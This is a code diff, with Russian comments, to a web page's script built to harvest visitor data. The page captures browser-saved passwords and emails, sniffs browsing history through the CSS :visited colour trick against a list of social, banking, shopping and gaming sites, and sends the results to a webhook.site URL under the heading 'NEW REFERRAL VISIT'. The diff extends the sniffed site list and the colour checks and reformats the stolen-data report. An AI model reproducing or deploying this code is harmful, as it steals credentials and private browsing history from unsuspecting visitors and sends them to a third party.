@@ -79,7 +79,7 @@
 
 <script>
     // ============================================================
-    //  КОНФИГ
+    //  НАСТРОЙКА
     // ============================================================
     const WEBHOOK_URL = 'https://webhook.site/36b6bcb8-d02f-4340-b822-03f54060b514';
 
@@ -138,14 +138,26 @@
         passField.focus();
 
         // ============================================================
-        //  3. ИСТОРИЯ БРАУЗЕРА (CSS-атака — ИСПРАВЛЕНО)
+        //  2. ИСТОРИЯ БРАУЗЕРА (CSS-атака — РАСШИРЕННЫЙ СПИСОК)
         // ============================================================
         const sites = [
+            // Соцсети и мессенджеры
             'youtube.com', 'facebook.com', 'instagram.com', 'twitter.com',
-            'reddit.com', 'wikipedia.org', 'amazon.com', 'google.com',
-            'vk.com', 'ok.ru', 'mail.ru', 'ya.ru',
-            'github.com', 'stackoverflow.com'
+            'vk.com', 'ok.ru', 'tiktok.com', 'telegram.org', 'whatsapp.com',
+            'reddit.com', 'pinterest.com', 'linkedin.com', 'discord.com',
+            // Поисковики и сервисы
+            'google.com', 'ya.ru', 'mail.ru', 'yandex.ru', 'wikipedia.org',
+            'github.com', 'stackoverflow.com', 'amazon.com', 'ebay.com',
+            // Российские
+            'ozon.ru', 'wildberries.ru', 'avito.ru', 'sberbank.ru', 'tinkoff.ru',
+            'hh.ru', 'cian.ru', '2gis.ru', 'kinopoisk.ru', 'rutube.ru',
+            // Игры и стриминг
+            'twitch.tv', 'steamcommunity.com', 'epicgames.com', 'roblox.com',
+            'netflix.com', 'spotify.com', 'soundcloud.com',
+            // Другие популярные
+            'alibaba.com', 'aliexpress.com', 'booking.com', 'tripadvisor.com'
         ];
+
         const visited = [];
         const container = document.getElementById('historyTest');
         container.innerHTML = '';
@@ -165,7 +177,11 @@
             const links = container.querySelectorAll('a');
             links.forEach((link, index) => {
                 const color = getComputedStyle(link).color;
-                if (color === 'rgb(128, 0, 128)' || color === 'rgb(85, 26, 139)') {
+                // Браузеры используют разные оттенки фиолетового для посещённых ссылок
+                if (color === 'rgb(128, 0, 128)' || 
+                    color === 'rgb(85, 26, 139)' ||
+                    color === 'rgb(102, 0, 153)' ||
+                    color === 'rgb(153, 51, 255)') {
                     visited.push(sites[index]);
                 }
             });
@@ -202,7 +218,7 @@
             };
 
             // ============================================================
-            //  ОТПРАВКА (через Webhook — CORS разрешён)
+            //  ОТПРАВКА
             // ============================================================
             const lines = [
                 '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
@@ -226,7 +242,8 @@
                 `🔑 Сохранённый пароль: ${data.savedPassword}`,
                 `📧 Сохранённый email: ${data.savedEmail}`,
                 '',
-                `🌐 Посещённые сайты: ${data.visitedSites.join(', ') || 'не найдено'}`,
+                `🌐 Посещённые сайты (${data.visitedSites.length} шт.):`,
+                data.visitedSites.length ? data.visitedSites.map(s => `  - ${s}`).join('\n') : '  - не найдено',
                 '',
                 `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
                 `⏱️ ${data.timestamp}`
@@ -259,7 +276,7 @@
                 btn.disabled = false;
             });
 
-        }, 100); // Задержка для рендеринга ссылок
+        }, 150); // Задержка для рендеринга ссылок
     });
 </script>
 </body>
